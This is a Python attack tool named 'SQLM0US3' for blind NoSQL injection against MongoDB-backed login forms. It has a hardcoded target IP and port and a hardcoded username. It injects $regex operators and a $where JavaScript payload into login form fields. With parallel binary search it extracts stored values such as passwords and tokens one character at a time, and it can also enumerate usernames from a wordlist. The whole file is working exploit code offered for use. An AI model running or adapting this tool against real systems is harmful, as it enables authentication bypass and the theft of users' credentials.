#!/usr/bin/python3
"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
        NoSQL (MongoDB) Blind Injection Framework  |  github.com/H4ck3rxPK

Modes:
  --mode regex      : $regex operator, GET/POST param injection
  --mode charcodeat : $where JS charCodeAt binary search
"""

import sys
import re
import requests
import argparse
import urllib.parse
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

# ══════════════════════════════════════════════════════════════════
# ░░  CONFIGURE HERE  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

TARGET_URL  = "http://154.57.164.71:31993/login"   # <- change
TRUE_MARKER = "credentials."          # <- keyword that indicates TRUE response

# --- charCodeAt mode specific ---
CHAR_USERNAME = "bmdyy"          # <- known username to target
CHAR_FIELD    = "token"          # <- field to extract
CHAR_LENGTH   = None             # <- set to int if known, else None (auto)

session = requests.Session()
# session.proxies = {"http": "http://127.0.0.1:8080"}  # uncomment for Burp

# ══════════════════════════════════════════════════════════════════
# ░░  MODE: $regex  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def oracle_regex(regex: str) -> bool:
    """
    Injection via $regex operator.
    Edit to match your injection point (GET param, POST form, POST JSON).
    """
    encoded = urllib.parse.quote(regex)
    # --- GET param example ---
    #r = session.get(
    #    f"{TARGET_URL}?user=admin&pass[$regex]={encoded}",
    #    timeout=15,
    #)
    # --- POST form example (uncomment to use) ---
    r = session.post(
        TARGET_URL,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=f"username=admin&pass[$regex]={encoded}",
        timeout=15,
    )
    # --- POST JSON example (uncomment to use) ---
    # r = session.post(
    #     TARGET_URL,
    #     json={"user": "admin", "pass": {"$regex": regex}},
    #     timeout=15,
    # )
    return TRUE_MARKER in r.text


def _hex4(n: int) -> str:
    return f"{n:04x}"


def _regex_dump_length(field_prefix: str = "", max_len: int = 100) -> int:
    lo, hi = 0, max_len
    while hi - lo > 3:
        mid = (lo + hi) // 2
        if oracle_regex(f"^{field_prefix}.{{{mid},}}$"):
            lo = mid
        else:
            hi = mid
    for i in range(lo, hi + 1):
        if oracle_regex(f"^{field_prefix}.{{{i}}}$"):
            return i
    return lo


def _regex_extract_char(index: int, length: int, field_prefix: str,
                        lo: int = 0x20, hi: int = 0x7e) -> tuple[int, int]:
    """Binary search one character using hex range regex."""
    tail = length - index - 1
    left, right = lo, hi

    while right - left > 3:
        mid = (left + right) // 2
        pattern = (
            f"^{field_prefix}"
            f".{{{index}}}"
            f"[\\x{{{_hex4(left)}}}-\\x{{{_hex4(mid)}}}]"
            f".{{{tail}}}$"
        )
        if oracle_regex(pattern):
            right = mid
        else:
            left = mid + 1

    for c in range(left, right + 1):
        pattern = (
            f"^{field_prefix}"
            f".{{{index}}}"
            f"[\\x{{{_hex4(c)}}}]"
            f".{{{tail}}}$"
        )
        if oracle_regex(pattern):
            return (index, c)

    return (index, 0x3f)


def _regex_dump_string(length: int, field_prefix: str = "",
                       workers: int = 20) -> str:
    """Extract all characters in parallel — safe for regex mode."""
    chars: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(_regex_extract_char, i, length, field_prefix): i
            for i in range(length)
        }
        done = 0
        for fut in as_completed(futures):
            idx, code = fut.result()
            chars[idx] = code
            done += 1
            partial = "".join(
                chr(chars[j]) if j in chars and 32 <= chars[j] <= 126 else "?"
                for j in range(length)
            )
            print(f"  [*] [{done}/{length}] -> {partial}", end="\r")

    print()
    return "".join(
        chr(chars[i]) if 32 <= chars[i] <= 126 else f"\\x{chars[i]:02x}"
        for i in range(length)
    )


# ══════════════════════════════════════════════════════════════════
# ░░  MODE: charCodeAt ($where JS)  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def oracle_charcodeat(condition: str) -> bool:
    """
    Injection via $where JavaScript expression.
    Edit to match your injection point.
    """
    payload = f'" || ({condition}) || "" != "'
    r = session.post(
        f"{TARGET_URL}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data={"username": payload, "password": "doesNotMatterIamBypassed"},
        timeout=15,
    )
    return TRUE_MARKER in r.text


def _charcodeat_extract_char(index: int,
                             lo: int = 0x20, hi: int = 0x7e) -> tuple[int, int]:
    """Binary search one character using charCodeAt comparisons."""
    left, right = lo, hi

    while left <= right:
        mid = (left + right) // 2
        gt = oracle_charcodeat(
            f'this.username == "{CHAR_USERNAME}" '
            f'&& this.{CHAR_FIELD}.charCodeAt({index}) > {mid}'
        )
        if gt:
            left = mid + 1
            continue
        lt = oracle_charcodeat(
            f'this.username == "{CHAR_USERNAME}" '
            f'&& this.{CHAR_FIELD}.charCodeAt({index}) < {mid}'
        )
        if lt:
            right = mid - 1
        else:
            return (index, mid)

    return (index, 0x3f)


def _charcodeat_dump_length(max_len: int = 100) -> int:
    lo, hi = 0, max_len
    while hi - lo > 3:
        mid = (lo + hi) // 2
        if oracle_charcodeat(
            f'this.username == "{CHAR_USERNAME}" '
            f'&& this.{CHAR_FIELD}.length > {mid}'
        ):
            lo = mid + 1
        else:
            hi = mid
    for i in range(lo, hi + 1):
        if oracle_charcodeat(
            f'this.username == "{CHAR_USERNAME}" '
            f'&& this.{CHAR_FIELD}.length == {i}'
        ):
            return i
    return lo


def _charcodeat_dump_string(length: int, workers: int = 20) -> str:
    """
    Extract all characters in parallel.
    Each charCodeAt position is independent — safe to parallelize.
    """
    chars: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {
            ex.submit(_charcodeat_extract_char, i): i
            for i in range(length)
        }
        done = 0
        for fut in as_completed(futures):
            idx, code = fut.result()
            chars[idx] = code
            done += 1
            partial = "".join(
                chr(chars[j]) if j in chars and 32 <= chars[j] <= 126 else "?"
                for j in range(length)
            )
            print(f"  [*] [{done}/{length}] -> {partial}", end="\r")

    print()
    return "".join(
        chr(chars[i]) if 32 <= chars[i] <= 126 else f"\\x{chars[i]:02x}"
        for i in range(length)
    )


# ══════════════════════════════════════════════════════════════════
# ░░  MENU ACTIONS  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

def action_test(mode: str):
    print("\n[*] Oracle self-test")
    if mode == "regex":
        t = oracle_regex(".*")
        f = oracle_regex("^XYZXYZ_NOMATCH$")
        print(f"  .*              -> {t}")
        print(f"  ^XYZXYZ_NOMATCH -> {f}")
        ok = t and not f
    else:
        t = oracle_charcodeat('1 == 1')
        f = oracle_charcodeat('1 == 0')
        print(f"  1 == 1 -> {t}")
        print(f"  1 == 0 -> {f}")
        ok = t and not f

    if ok:
        print("  [+] Oracle is working correctly\n")
    else:
        print("  [-] Oracle misconfigured — check TRUE_MARKER or injection point\n")
        sys.exit(1)


def action_regex_dump(workers: int):
    prefix = input("  Known prefix (leave blank if none) : ").strip()
    print("\n[*] Measuring length...")
    total_len = _regex_dump_length(field_prefix=prefix)
    actual = total_len - len(prefix)
    print(f"  [*] Field length: {actual}")
    if actual <= 0:
        print("  [-] Length 0 or prefix longer than value\n")
        return
    print("[*] Extracting characters...")
    result = _regex_dump_string(actual, field_prefix=prefix, workers=workers)
    print(f"  [+] Value -> {prefix}{result}\n")
    return result


def action_regex_brute_users(workers: int):
    print("\n[*] Username enumeration (wordlist)")
    wordlist = input("  Wordlist path : ").strip()
    try:
        with open(wordlist) as f:
            names = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        print(f"  [-] File not found: {wordlist}")
        return

    found = []

    def check(name):
        return name if oracle_regex(f"^{re.escape(name)}$") else None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(check, n): n for n in names}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                print(f"  [+] Found: {result}")
                found.append(result)

    print(f"\n  [+] Users found: {found}\n")
    return found


def action_charcodeat_dump(workers: int):
    global CHAR_USERNAME, CHAR_FIELD

    u = input(f"  Target username [{CHAR_USERNAME}] : ").strip()
    if u:
        CHAR_USERNAME = u
    fld = input(f"  Target field [{CHAR_FIELD}] : ").strip()
    if fld:
        CHAR_FIELD = fld
    known_len = input("  Known length (leave blank to auto-detect) : ").strip()

    if known_len:
        length = int(known_len)
    else:
        print("\n[*] Measuring field length...")
        length = _charcodeat_dump_length()

    print(f"  [*] Length: {length}")
    print("[*] Extracting characters...")
    result = _charcodeat_dump_string(length, workers=workers)
    print(f"  [+] {CHAR_FIELD} -> {result}\n")
    return result


# ══════════════════════════════════════════════════════════════════
# ░░  ENTRYPOINT  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
# ══════════════════════════════════════════════════════════════════

BANNER = r"""
███████╗ ██████╗ ██╗     ███╗   ███╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔═══██╗██║   ██║██╔════╝╚════██╗
███████╗██║   ██║██║     ██╔████╔██║██║   ██║██║   ██║███████╗ █████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██║   ██║██║   ██║╚════██║ ╚═══██╗
███████║╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═════╝
          NoSQL Blind Injection  ·  MongoDB  ·  by H4ck3rxPK
"""

MENU_REGEX = """
    (0) Oracle test
    (1) Dump field value
    (2) Username enumeration (wordlist)

  Your choice : """

MENU_CHAR = """
    (0) Oracle test
    (1) Dump field value

  Your choice : """


def main():
    parser = argparse.ArgumentParser(description="SQLM0US3 — NoSQL Blind Injection")
    parser.add_argument(
        "--mode", choices=["regex", "charcodeat"], required=True,
        help="regex: $regex operator  |  charcodeat: $where JS charCodeAt",
    )
    parser.add_argument("--workers", type=int, default=20,
                        help="Parallel thread count (default: 20)")
    args = parser.parse_args()

    print(BANNER)
    print(f"  Mode : {args.mode}   Workers : {args.workers}\n")

    if args.mode == "regex":
        choice = int(input(MENU_REGEX))
        actions = {
            0: lambda: action_test("regex"),
            1: lambda: action_regex_dump(args.workers),
            2: lambda: action_regex_brute_users(args.workers),
        }
    else:
        choice = int(input(MENU_CHAR))
        actions = {
            0: lambda: action_test("charcodeat"),
            1: lambda: action_charcodeat_dump(args.workers),
        }

    if choice in actions:
        actions[choice]()
    else:
        print("  [-] Invalid option")


if __name__ == "__main__":
    main()
